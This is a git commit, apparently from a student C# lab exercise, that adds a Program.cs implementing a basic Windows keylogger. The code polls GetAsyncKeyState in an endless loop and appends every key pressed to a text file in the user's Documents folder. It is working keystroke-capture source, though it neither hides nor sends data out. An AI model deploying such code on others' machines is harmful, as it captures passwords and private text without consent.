cf0ab82d55744bc71c8853fabfd8203b2b0dd958
IvanGin <52858229+IvanSir@users.noreply.github.com>
2020-04-09 22:22:11 +0300

    New

---
+++ Lab4_CSharp/pt.1/Program.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.IO;
+using System.Linq;
+using System.Threading;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+
+namespace c4
+{
+    static class Program
+    {
+       
+
+            [DllImport("User32.dll")]
+            public static extern int GetAsyncKeyState(Int32 i);
+
+            static void Main()
+            {
+                while (true)
+                {
+                         String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+                    if (!Directory.Exists(filepath))
+                    {
+                        Directory.CreateDirectory(filepath);
+                    }
+                    string path = (filepath + @"\fileofloggedkeys.txt");
+
+                    if (!File.Exists(path))
+                    {
+                        using (StreamWriter sw = File.CreateText(path)) ;
+                    }
+
+                    Thread.Sleep(5);
+                    for (Int32 i = 0; i < 255; i++)
+                    {
+                        int state = GetAsyncKeyState(i);
+                        if (state == 32769)
+                        {
+                        
+                        Console.WriteLine((Keys)i);
+                             using (StreamWriter sw = File.AppendText(path))
+                            {
+                                sw.WriteLine((Keys)i);
+                            }
+
+                        }
+                    }
+                }
+
+            }
+
+        }
+    }
